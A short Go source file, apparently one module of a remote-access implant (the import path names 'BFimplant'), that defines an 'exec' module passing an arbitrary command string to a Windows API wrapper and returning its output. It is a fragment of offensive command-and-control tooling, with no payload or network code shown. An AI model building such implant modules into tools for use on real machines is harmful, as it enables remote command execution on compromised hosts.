package modules

import (
	"fmt"
	"BFimplant/winapiV2"

)

type ExecuteModule struct{}

func NewExecuteModule() *ExecuteModule {
	return &ExecuteModule{}
}

func (m *ExecuteModule) Name() string {
	return "exec"
}

func (m *ExecuteModule) Execute(command string, data []byte) (string, error) {

	fmt.Println("Executing command:", command)

	output, err := winapiV2.Exec(command)
	if err != nil {
		fmt.Println("Error executing command:", err)
		return "", err
	}
	fmt.Println(output.String())

	return output.String(), nil
}
